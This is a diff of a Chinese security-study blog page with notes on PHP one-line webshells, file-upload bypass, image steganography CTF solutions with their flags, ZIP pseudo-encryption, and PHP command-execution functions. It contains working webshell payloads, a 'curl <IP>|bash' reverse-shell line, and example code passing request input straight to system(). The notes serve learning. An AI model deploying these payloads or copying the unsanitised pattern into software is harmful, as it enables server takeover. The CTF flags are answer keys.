@@ -71,6 +71,328 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-一句话木马与文件上传" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="article-date">
+  <time class="dt-published" datetime="2023-02-05T09:05:24.000Z" itemprop="datePublished">2023-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">一句话木马与文件上传</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>一句话木马</strong>                  <a href="af://n2/"> </a></p>
+<p><strong>简介</strong>                                   <a href="af://n3/"> </a></p>
+<p>在很多的渗透过程中，渗透人员会上传一句话木马(Webshell)到目前web服务目录继而提权获取系统权限，不论asp、php、jsp、aspx都是如此。</p>
+<p>基本应用为利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过工具即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[‘attack’]表示从页面中获得attack这个参数值。 </p>
+<p><strong>一句话木马实例</strong> <a href="af://n7/"> </a>下面是最简单的一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&quot;a&quot;])?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>$_POST用来获取参数值</p>
+<p>@eval()用于免报错代码执行</p>
+<p>因此直接向该页面传参即可执行</p>
+<p>反弹shell：curl 110.40.136.140|bash</p>
+<p>常见的一句话木马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%                                    %&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>文件上传漏洞</strong> <a href="af://n16/"> </a><strong>简介</strong> <a href="af://n17/"> </a></p>
+<p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p>
+<p>​                </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if (move_uploaded_fil($temp_fil, $img_path))&#123;</span><br><span class="line">$is_upload =true;</span><br><span class="line">$msg=&quot;upioad success!&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$msg =&#x27;upload failed!&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="前端过滤"><a href="#前端过滤" class="headerlink" title="前端过滤"></a>前端过滤</h1><h1 id="后端过滤php"><a href="#后端过滤php" class="headerlink" title="后端过滤php"></a>后端过滤php</h1><h1 id="后端过滤php且检测文件头"><a href="#后端过滤php且检测文件头" class="headerlink" title="后端过滤php且检测文件头"></a>后端过滤php且检测文件头</h1><p>文件头是位于文件开头的一段承担一定任务的数据，一般都在开头的部分，描述一个文件的一些重要的属性。</p>
+<table>
+<thead>
+<tr>
+<th><strong>文件类型</strong></th>
+<th><strong>后缀</strong></th>
+<th><strong>文件头</strong></th>
+<th><strong>文件尾</strong></th>
+<th><strong>标志</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>JPEG</td>
+<td>.jpg&#x2F;.jpeg</td>
+<td>FFD8FF</td>
+<td>FFD9</td>
+<td>JFIF</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>.png</td>
+<td>89504E47</td>
+<td>AE426082</td>
+<td>PNG  IEND IHDR</td>
+</tr>
+<tr>
+<td>GIF</td>
+<td>.gif</td>
+<td>47494638</td>
+<td>003B</td>
+<td>GIT9a</td>
+</tr>
+<tr>
+<td>TIFF</td>
+<td>.tif&#x2F;.tiff</td>
+<td>49492A00</td>
+<td>4D4D2A00</td>
+<td>-  II MM</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>文件类型</strong></th>
+<th><strong>后缀</strong></th>
+<th><strong>文件头</strong></th>
+<th><strong>文件尾</strong></th>
+<th><strong>标志</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WAVE</td>
+<td>.wav</td>
+<td>52494646</td>
+<td>-</td>
+<td>RIFF</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th><strong>文件类型</strong></th>
+<th><strong>后缀</strong></th>
+<th><strong>文件头</strong></th>
+<th><strong>文件尾</strong></th>
+<th><strong>标志</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ZIP  Archive</td>
+<td>.zip</td>
+<td>504B0304</td>
+<td>-</td>
+<td>PK</td>
+</tr>
+<tr>
+<td>RAR  Archive</td>
+<td>.rar</td>
+<td>52617221</td>
+<td>-</td>
+<td>RAR!</td>
+</tr>
+<tr>
+<td>7Z  Archive</td>
+<td>.7z</td>
+<td>377ABCAF</td>
+<td>-</td>
+<td>7z</td>
+</tr>
+</tbody></table>
+<p>.htaccess文件是Apache服务中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮助我们实现：网页301重定向、自定义404错误页面，改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问，禁止目录列表，配置默认文档等功能。</p>
+<p>$deny_ext &#x3D; array(“.php”, “.php5”, “.php4”, “.php3”, “.php2”, “.php1”, “.html”, </p>
+<p>“.htm”, “.phtml”, “.pht”, “.pHp”, “.pHp5”, “.pHp4”, “.pHp3”, “.pHp2”, “.pHp1”, </p>
+<p>“.Html”, “.Htm”, “.pHtml”, “.jsp”, “.jspa”, “.jspx”, “.jsw”, “.jsv”, “.jspf”, </p>
+<p>“.jtml”, “.jSp”, “.jSpx”, “.jSpa”, “.jSw”, “.jSv”, “.jSpf”, “.jHtml”, “.asp”, </p>
+<p>“.aspx”, “.asa”, “.asax”, “.ascx”, “.ashx”, “.asmx”, “.cer”, “.aSp”, “.aSpx”, </p>
+<p>“.aSa”, “.aSax”, “.aScx”, “.aShx”, “.aSmx”, “.cEr”, “.sWf”, “.swf”, “.ini”); </p>
+<h1 id="htaccess截断绕过后端检测"><a href="#htaccess截断绕过后端检测" class="headerlink" title=".htaccess截断绕过后端检测"></a>.htaccess截断绕过后端检测</h1>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/05/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" data-id="cldsvjr5i00016c845lx1b9fp" data-title="一句话木马与文件上传" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-图片隐写" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" class="article-date">
+  <time class="dt-published" datetime="2023-02-05T09:04:47.000Z" itemprop="datePublished">2023-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="一、图片隐写的常见隐写方法"><a href="#一、图片隐写的常见隐写方法" class="headerlink" title="一、图片隐写的常见隐写方法"></a>一、图片隐写的常见隐写方法</h1><p><strong>ps：图片格式特征</strong></p>
+<ol>
+<li><h4 id="GIF图多帧隐藏"><a href="#GIF图多帧隐藏" class="headerlink" title="GIF图多帧隐藏"></a>GIF图多帧隐藏</h4></li>
+</ol>
+<h4 id="1-颜色通道隐藏"><a href="#1-颜色通道隐藏" class="headerlink" title="1.颜色通道隐藏"></a>1.颜色通道隐藏</h4><ol start="2">
+<li><h4 id="不同帧图信息隐藏"><a href="#不同帧图信息隐藏" class="headerlink" title="不同帧图信息隐藏"></a>不同帧图信息隐藏</h4></li>
+<li><h4 id="不同帧对比隐写"><a href="#不同帧对比隐写" class="headerlink" title="不同帧对比隐写"></a>不同帧对比隐写</h4></li>
+<li><h4 id="Exif信息隐藏"><a href="#Exif信息隐藏" class="headerlink" title="Exif信息隐藏"></a>Exif信息隐藏</h4></li>
+<li><h4 id="图片修复"><a href="#图片修复" class="headerlink" title="图片修复"></a>图片修复</h4></li>
+</ol>
+<h4 id="1-图片头修复"><a href="#1-图片头修复" class="headerlink" title="1.图片头修复"></a>1.图片头修复</h4><ol start="6">
+<li><h4 id="图片尾修复"><a href="#图片尾修复" class="headerlink" title="图片尾修复"></a>图片尾修复</h4></li>
+</ol>
+<h4 id="3-CRC校验修复"><a href="#3-CRC校验修复" class="headerlink" title="3.CRC校验修复"></a>3.CRC校验修复</h4><h4 id="4-最低有效位LSB隐写"><a href="#4-最低有效位LSB隐写" class="headerlink" title="4.最低有效位LSB隐写"></a>4.最低有效位LSB隐写</h4><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h5 id="一，图片的格式"><a href="#一，图片的格式" class="headerlink" title="一，图片的格式"></a>一，图片的格式</h5><h1 id="BMP"><a href="#BMP" class="headerlink" title="BMP"></a>BMP</h1><p><strong>文件头</strong></p>
+<p><strong>42 4D</strong></p>
+<p><strong><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202302062150483.png" alt="img"></strong></p>
+<p>题型：bmp文件的识别，图片的高度修改 （bmp文件头冗余隐写，数据区隐写（alpha通道，数据覆盖，尾部追加隐写）</p>
+<h1 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h1><p><strong>文件头：FF D8      文件尾FF D9</strong></p>
+<p>题型：查看图片属性，图片高度修改，文件中存在冗余字节（在文件头尾存在字符串），图片压缩包分离</p>
+<h1 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h1><p><strong>开始标志：89 50 4E 47 0D 0A 1A 0A</strong></p>
+<p><strong>结束标记：AE 42 60 82</strong></p>
+<p>题型：IHDR隐写（图片高宽度的修改，CRC爆破） IDAT 隐写 ，crc校验错误可以被010显示（crc.py解）</p>
+<h1 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h1><p>题型：逐帧查看， 分离合并</p>
+<h1 id="一，GIF图多帧隐藏"><a href="#一，GIF图多帧隐藏" class="headerlink" title="一，GIF图多帧隐藏"></a>一，GIF图多帧隐藏</h1><p><strong>stegsolve.jar 工具</strong></p>
+<p>打开图片后发现图片不断闪动，隐约可以看到flag，使用stegsolve.jar 工具查看</p>
+<h1 id="二，Exif信息隐藏"><a href="#二，Exif信息隐藏" class="headerlink" title="二，Exif信息隐藏"></a>二，Exif信息隐藏</h1><p>右键查看图片属性。。。。。</p>
+<h1 id="三，图片修复"><a href="#三，图片修复" class="headerlink" title="三，图片修复"></a>三，图片修复</h1><h2 id="1，图片头尾修复"><a href="#1，图片头尾修复" class="headerlink" title="1，图片头尾修复"></a>1，图片头尾修复</h2><p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202302062150523.png" alt="img"></p>
+<p>题目中提示图片修复或者图片无法打开，010查看文件头，照着正确的文件头修改。</p>
+<p><strong>图片尾</strong></p>
+<p>zip文件的结尾以一串504B0506开始</p>
+<p>JPG文件结尾为FFD9。</p>
+<p>PNG文件 结尾为000049454E44AE426082。</p>
+<p>Gif文件结尾为3B。</p>
+<p><strong>CRC校验修复</strong></p>
+<p>这个东西010会提示</p>
+<p><strong>LSB加密</strong></p>
+<p>这个也没多难，用工具就可以</p>
+<h1 id="题目训练"><a href="#题目训练" class="headerlink" title="题目训练"></a>题目训练</h1><h3 id="金三胖（buuctf"><a href="#金三胖（buuctf" class="headerlink" title="金三胖（buuctf)"></a>金三胖（buuctf)</h3><p>注意：得到的 flag 请包上 flag{} 提交</p>
+<p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202302062150329.gif" alt="aaa"></p>
+<h5 id="解题思路：打开是gif格式图片，隐约出现flag，考虑逐帧查看，使用工具stegsolve-jar"><a href="#解题思路：打开是gif格式图片，隐约出现flag，考虑逐帧查看，使用工具stegsolve-jar" class="headerlink" title="解题思路：打开是gif格式图片，隐约出现flag，考虑逐帧查看，使用工具stegsolve.jar"></a>解题思路：打开是gif格式图片，隐约出现flag，考虑逐帧查看，使用工具stegsolve.jar</h5><h5 id="解题：使用stegsolve-jar-的farme功能逐帧查看GIF，得到flag-he11ohongke"><a href="#解题：使用stegsolve-jar-的farme功能逐帧查看GIF，得到flag-he11ohongke" class="headerlink" title="解题：使用stegsolve.jar 的farme功能逐帧查看GIF，得到flag{he11ohongke}"></a>解题：使用stegsolve.jar 的farme功能逐帧查看GIF，得到flag{he11ohongke}</h5><h2 id="大白（buuctf"><a href="#大白（buuctf" class="headerlink" title="大白（buuctf)"></a>大白（buuctf)</h2><p>看不到图？ 是不是屏幕太小了 注意：得到的 flag 请包上 flag{} 提交</p>
+<h5 id="解题思路：《看不到图》，肯定是高度有问题（很少是宽度，宽度一改就废），用010打开后修改就行。"><a href="#解题思路：《看不到图》，肯定是高度有问题（很少是宽度，宽度一改就废），用010打开后修改就行。" class="headerlink" title="解题思路：《看不到图》，肯定是高度有问题（很少是宽度，宽度一改就废），用010打开后修改就行。"></a>解题思路：《看不到图》，肯定是高度有问题（很少是宽度，宽度一改就废），用010打开后修改就行。</h5><p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202302062151440.bmp" alt="capture_20230206143753132"></p>
+<h5 id="解题：先右键查看图片属性，发现图片是256x679，高度明显不够，然后将这两个数字转化为16进制，在010上查找并修改（一般修改为一致）就可得到flag"><a href="#解题：先右键查看图片属性，发现图片是256x679，高度明显不够，然后将这两个数字转化为16进制，在010上查找并修改（一般修改为一致）就可得到flag" class="headerlink" title="解题：先右键查看图片属性，发现图片是256x679，高度明显不够，然后将这两个数字转化为16进制，在010上查找并修改（一般修改为一致）就可得到flag"></a>解题：先右键查看图片属性，发现图片是256x679，高度明显不够，然后将这两个数字转化为16进制，在010上查找并修改（一般修改为一致）就可得到flag</h5><p>flag{He1l0_d4_ba1}</p>
+<h2 id="ningen（buuctf"><a href="#ningen（buuctf" class="headerlink" title="ningen（buuctf)"></a>ningen（buuctf)</h2><p>人类的科学日益发展，对自然的研究依然无法满足，传闻日本科学家秋明重组了基因序列，造出了名为ningen的超自然生物。某天特工小明偶然截获了日本与俄罗斯的秘密通信，文件就是一张ningen的特写，小明通过社工，知道了秋明特别讨厌中国的六位银行密码，喜欢四位数。你能找出黑暗科学家秋明的秘密么？ 注意：得到的 flag 请包上 flag{} 提交</p>
+<h5 id="解题思路：看到打开为图片，提示中提到了密码，考虑是图文分离，然后压缩包加密"><a href="#解题思路：看到打开为图片，提示中提到了密码，考虑是图文分离，然后压缩包加密" class="headerlink" title="解题思路：看到打开为图片，提示中提到了密码，考虑是图文分离，然后压缩包加密"></a>解题思路：看到打开为图片，提示中提到了密码，考虑是图文分离，然后压缩包加密</h5><h5 id="解题：使用010打开发现图片中包含着一个txt的16进制码，然后使用binwalk实现文件分离"><a href="#解题：使用010打开发现图片中包含着一个txt的16进制码，然后使用binwalk实现文件分离" class="headerlink" title="解题：使用010打开发现图片中包含着一个txt的16进制码，然后使用binwalk实现文件分离"></a>解题：使用010打开发现图片中包含着一个txt的16进制码，然后使用binwalk实现文件分离</h5><p><img src="https://raw.githubusercontent.com/Hfjxfw/Hfjxfw/main/202302062151030.png" alt="在这里插入图片描述"></p>
+<p>得到一个zip的加密压缩文件，题目提示为四位数密码，使用zip爆破出密码8683，然后得到flag</p>
+<p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p>
+<h2 id="Gradient-sky"><a href="#Gradient-sky" class="headerlink" title="Gradient sky"></a>Gradient sky</h2><p>题目描述：Gradient sky is a begginer level ctf challenge which is aimed towards rookies.</p>
+<p>这个就010打开直接flag   <strong>csictf{j0ker_w4snt_happy}</strong></p>
+<p>。。。。。。</p>
+<h2 id="相机制造商"><a href="#相机制造商" class="headerlink" title="相机制造商"></a>相机制造商</h2><p>题目描述：这张图片看上去像素不错啊。摄影师是用什么厂商的相机拍出来的呢</p>
+<p>这个就010打开直接flag   <strong>Flag{6MO3Nbdad7umkHmQ}</strong></p>
+<p>。。。。。。。就很。。。。。。。</p>
+<h2 id="图片修复-1"><a href="#图片修复-1" class="headerlink" title="图片修复"></a>图片修复</h2><p>GIF的文件头修复，这里使用010时要先插入00字节在进行修改，修改完后逐帧查看得到flag <strong>Flag{fxiZHXePJ}</strong></p>
+<p>。。。。。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/05/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/" data-id="cldsvjr5j00026c847cmi8mbo" data-title="图片隐写" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-crc校验与压缩包" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/" class="article-date">
+  <time class="dt-published" datetime="2023-02-05T09:04:14.000Z" itemprop="datePublished">2023-02-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/">crc校验与压缩包</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="CRC校验"><a href="#CRC校验" class="headerlink" title="CRC校验"></a>CRC校验</h1><h4 id="1-什么是crc校验？"><a href="#1-什么是crc校验？" class="headerlink" title="1.什么是crc校验？"></a>1.什么是crc校验？</h4><p>CRC（Cyclic Redundancy Check）循环冗余检验，是一种用于检测数字数据错误的技术。作为一种校验和类型，CRC 根据文件或更大数据集的构建生成固定长度的数据集。就其用途而言，CRC是一种哈希函数，用于检测数字电信网络和硬盘驱动器等存储设备中常用的原始计算机数据的意外更改。</p>
+<h4 id="2-crc的参数模型"><a href="#2-crc的参数模型" class="headerlink" title="2.crc的参数模型"></a>2.crc的参数模型</h4><ul>
+<li><strong>NAME</strong>：参数模型名称。</li>
+<li><strong>WIDTH</strong>：宽度，即CRC比特数。</li>
+<li><strong>POLY</strong>：生成项的简写，以16进制表示。例如：CRC-32即是0x04C11DB7，忽略了最高位的”1”，即完整的生成项是0x104C11DB7。</li>
+<li><strong>INIT</strong>：这是算法开始时寄存器（crc）的初始化预置值，十六进制表示。</li>
+<li><strong>REFIN</strong>：待测数据的每个字节是否按位反转，True或False。</li>
+<li><strong>REFOUT</strong>：在计算后之后，异或输出之前，整个数据是否按位反转，True或False。</li>
+<li><strong>XOROUT</strong>：计算结果与此参数异或后得到最终的CRC值。</li>
+</ul>
+<h4 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h4><p>一般使用crc-32，misc中用于计算图片的高度（一般不能为宽）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">crc32key = 0xC1D0B3E4</span><br><span class="line">for i in range(0, 65535):</span><br><span class="line">  height = struct.pack(&#x27;&gt;i&#x27;, i)</span><br><span class="line">  data = b&#x27;\x49\x48\x44\x52\x00\x00\x0C\xC0&#x27;+height+ b&#x27;\x08\x06\x00\x00\x00&#x27;</span><br><span class="line"> </span><br><span class="line">  crc32result = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">  if crc32result == crc32key:</span><br><span class="line">    print &#x27;&#x27;.join(map(lambda c: &quot;%02X&quot; % ord(c), height))</span><br></pre></td></tr></table></figure>
+
+<h1 id="RAR压缩包"><a href="#RAR压缩包" class="headerlink" title="RAR压缩包"></a>RAR压缩包</h1><h4 id="1，工具"><a href="#1，工具" class="headerlink" title="1，工具"></a>1，工具</h4><p>使用rar工具爆破</p>
+<p>![capture_20230205172023883](D:\My Blog\source_posts\crc校验与压缩包.assets\capture_20230205172023883.bmp)</p>
+<h4 id="2-RAR常见的块类型"><a href="#2-RAR常见的块类型" class="headerlink" title="2.RAR常见的块类型"></a>2.RAR常见的块类型</h4><p>标记块：HEAD_TYPE&#x3D;0x72 (<strong>52 61 72 21 1A 07 00</strong>)<br>压缩文件头：HEAD_TYPE&#x3D;0x73<br>文件头：HEAD_TYPE&#x3D;0x74<br>子块：HEAD_TYPE&#x3D;0x7A<br>最后的结束块：HEAD_TYPE&#x3D;0x7B </p>
+<p>CRC校验值：CF 90</p>
+<p>rar加密：20 90，修改20可以实现伪加密</p>
+<h4 id="3，ZIP压缩源文件的结束标志"><a href="#3，ZIP压缩源文件的结束标志" class="headerlink" title="3，ZIP压缩源文件的结束标志"></a>3，ZIP压缩源文件的结束标志</h4><ul>
+<li><p>ZIP 文件头 <code>50 4B 03 04 0A 00 00 00</code></p>
+</li>
+<li><p>ZIP 文件尾 <code>50 4B 05 06 00 00 00 00 + 其他字符</code></p>
+</li>
+<li><p>压缩源文件数据区：<br>50 4B 03 04：这是头文件标记（0x04034b50）<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>00 00：扩展记录长度<br>6B65792E7478740BCECC750E71ABCE48CDC9C95728CECC2DC849AD284DAD0500<br>压缩源文件目录区：<br>50 4B 01 02：目录中文件文件头标记(0x02014b50)<br>3F 00：压缩使用的 pkware 版本<br>14 00：解压文件所需 pkware 版本<br>00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）<br>08 00：压缩方式<br>5A 7E：最后修改文件时间<br>F7 46：最后修改文件日期<br>16 B5 80 14：CRC-32校验（1480B516）<br>19 00 00 00：压缩后尺寸（25）<br>17 00 00 00：未压缩尺寸（23）<br>07 00：文件名长度<br>24 00：扩展字段长度<br>00 00：文件注释长度<br>00 00：磁盘开始号<br>00 00：内部文件属性<br>20 00 00 00：外部文件属性<br>00 00 00 00：局部头部偏移量<br>6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001<br>压缩源文件目录结束标志：<br>50 4B 05 06：目录结束标记<br>00 00：当前磁盘编号<br>00 00：目录区开始磁盘编号<br>01 00：本磁盘上纪录总数<br>01 00：目录区中纪录总数<br>59 00 00 00：目录区尺寸大小<br>3E 00 00 00：目录区对第一张磁盘的偏移量<br>00 00：ZIP 文件注释长度</p>
+<h4 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h4><p><strong>未加密：</strong></p>
+<p>文件头中的全局方式位标记为00 00</p>
+<p> 目录中源文件的全局方式位标记为00 00</p>
+<p><strong>伪加密：</strong></p>
+<p>文件头中的全局方式位标记为00 00</p>
+<p>目录中源文件的全局方式位标记为09 00</p>
+<p><strong>真加密：</strong></p>
+<p>文件头中的全局方式位标记为09 00</p>
+<p>目录中源文件的全局方式位标记为09 00</p>
+<p>ps:也不一定要09 00或00 00，只要是奇数都视为加密，而偶数则视为未加密</p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/02/05/crc%E6%A0%A1%E9%AA%8C%E4%B8%8E%E5%8E%8B%E7%BC%A9%E5%8C%85/" data-id="cldsvjr5f00006c846qaq6tfi" data-title="crc校验与压缩包" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-PHP命令执行漏洞" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2023/02/05/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
@@ -93,7 +415,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="PHP命令执行漏洞"><a href="#PHP命令执行漏洞" class="headerlink" title="PHP命令执行漏洞"></a>PHP命令执行漏洞</h1><h4 id="1-什么是命令执行"><a href="#1-什么是命令执行" class="headerlink" title="1.什么是命令执行"></a>1.什么是命令执行</h4><h4 id="2-命令执行的思路准备"><a href="#2-命令执行的思路准备" class="headerlink" title="2.命令执行的思路准备"></a>2.命令执行的思路准备</h4><h4 id="3-常用的危险函数与作用"><a href="#3-常用的危险函数与作用" class="headerlink" title="3.常用的危险函数与作用"></a>3.常用的危险函数与作用</h4><h4 id="4-常见的过滤函数与作用"><a href="#4-常见的过滤函数与作用" class="headerlink" title="4.常见的过滤函数与作用"></a>4.常见的过滤函数与作用</h4><ul>
+        <h1 id="PHP命令执行漏洞"><a href="#PHP命令执行漏洞" class="headerlink" title="PHP命令执行漏洞"></a>PHP命令执行漏洞</h1><h4 id="1-什么是命令执行"><a href="#1-什么是命令执行" class="headerlink" title="1.什么是命令执行"></a>1.什么是命令执行</h4><h4 id="2-命令执行的思路准备"><a href="#2-命令执行的思路准备" class="headerlink" title="2.命令执行的思路准备"></a>2.命令执行的思路准备</h4><h4 id="3-常用的危险函数与作用"><a href="#3-常用的危险函数与作用" class="headerlink" title="3.常用的危险函数与作用"></a>3.常用的危险函数与作用</h4><h4 id="4-常见的过滤函数与作用"><a href="#4-常见的过滤函数与作用" class="headerlink" title="4.常见的过滤函数与作用"></a>4.常见的过滤函数与作用</h4><h4 id="5-远程命令执行函数的利用"><a href="#5-远程命令执行函数的利用" class="headerlink" title="5.远程命令执行函数的利用"></a>5.远程命令执行函数的利用</h4><ul>
 <li></li>
 <li></li>
 </ul>
@@ -103,15 +425,58 @@
 <li>存在可执行命令的危险函数</li>
 <li>火狐以及HackBar的插件</li>
 </ol>
-<h5 id="三，常用的危险函数"><a href="#三，常用的危险函数" class="headerlink" title="三，常用的危险函数"></a>三，常用的危险函数</h5><ul>
-<li><p>[system()和passthru()]</p>
-</li>
-<li><p>[exec()]</p>
-</li>
-<li><p>[shell_exec()]</p>
-</li>
-</ul>
-<p>​                       </p>
+<h5 id="三，常用的危险函数"><a href="#三，常用的危险函数" class="headerlink" title="三，常用的危险函数"></a>三，常用的危险函数</h5><p><strong>1.system()</strong><br>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
+<p>system — 执行外部程序，并且显示输出，有回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">system($a);</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong>passthru()</strong><br>(PHP 4, PHP 5, PHP 7, PHP 8)</li>
+</ol>
+<p>passthru — 执行外部程序并且显示原始输出  有回显</p>
+<p>跟system()类似</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">passthru($a);</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.exec() &#x2F; shell_exec()</strong><br>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
+<p>exec — 执行一个外部程序</p>
+<p>exec()跟shell_exec()都是无回显的，需要添加echo  输出</p>
+<p>exec只返回最后一行内容 ，shell_exec()返回完整内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;id&#x27;];</span><br><span class="line">echo shell_exec($a);</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li><strong>&#96;(反引号)</strong><br>返回多行内容  无回显，需要使用 echo 输出结果</li>
+</ol>
